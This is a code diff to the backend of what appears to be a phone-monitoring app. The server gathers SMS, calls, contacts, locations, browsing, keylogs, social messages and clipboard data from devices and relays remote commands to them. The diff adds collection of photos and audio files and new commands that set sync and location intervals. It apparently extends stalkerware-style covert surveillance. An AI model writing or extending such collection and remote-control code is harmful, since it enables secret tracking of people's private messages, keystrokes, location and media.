@@ -151,7 +151,8 @@ const appendHistory = async (refPath, entry, cap) => {
 const MODULE_CAPS = {
   sms: 1000, calls: 1000, contacts: 2000, locations: 1000,
   browsing: 1000, media: 1000, apps: 500, device: 20,
-  network: 100, notifications: 300, keylog: 500, events: 300
+  network: 100, notifications: 300, keylog: 500, events: 300,
+  photos: 60, audio: 12
 }
 
 const TYPE_TO_MODULE = {
@@ -169,7 +170,9 @@ const TYPE_TO_MODULE = {
   social_message: 'keylog',
   clipboard: 'keylog',
   window_change: 'events',
-  focus: 'events'
+  focus: 'events',
+  photo_file: 'photos',
+  audio_file: 'audio'
 }
 
 const hashString = (s) => crypto.createHash('sha1').update(String(s)).digest('hex')
@@ -518,7 +521,10 @@ app.post('/api/v2/pair', verifyUser, pairLimiter, async (req, res) => {
 // Remote command relay: the dashboard writes a command into devices/<id>/commands
 // and the app's Firebase command listener executes it (SYNC_NOW, FORCE_COLLECT,
 // COLLECT_LOCATION, UPDATE_INTERVAL). This is the manual "Sync now" loop.
-const COMMAND_WHITELIST = ['SYNC_NOW', 'FORCE_COLLECT', 'COLLECT_LOCATION', 'UPDATE_INTERVAL']
+const COMMAND_WHITELIST = ['SYNC_NOW', 'FORCE_COLLECT', 'COLLECT_LOCATION', 'UPDATE_INTERVAL', 'UPDATE_SYNC_INTERVAL', 'UPDATE_LOCATION_INTERVAL']
+
+// Intervals the dashboard offers (minutes) — matches the selector options.
+const INTERVAL_CHOICES = [5, 15, 30, 60, 180, 360, 720, 1440]
 
 app.post('/api/v2/devices/:deviceId/command', verifyUser, async (req, res) => {
  try {
@@ -532,8 +538,9 @@ app.post('/api/v2/devices/:deviceId/command', verifyUser, async (req, res) => {
  if (!COMMAND_WHITELIST.includes(type)) return res.status(400).json({ error: 'Unknown command' })
 
  const payload = { type, timestamp: Date.now() }
- if (type === 'UPDATE_INTERVAL' && typeof interval_minutes === 'number' &&
-     interval_minutes >= 5 && interval_minutes <= 1440) {
+ if ((type === 'UPDATE_INTERVAL' || type === 'UPDATE_SYNC_INTERVAL' ||
+      type === 'UPDATE_LOCATION_INTERVAL') &&
+     typeof interval_minutes === 'number' && INTERVAL_CHOICES.includes(interval_minutes)) {
    payload.interval_minutes = interval_minutes
  }
  await db.ref(`devices/${deviceId}/commands`).set(payload)
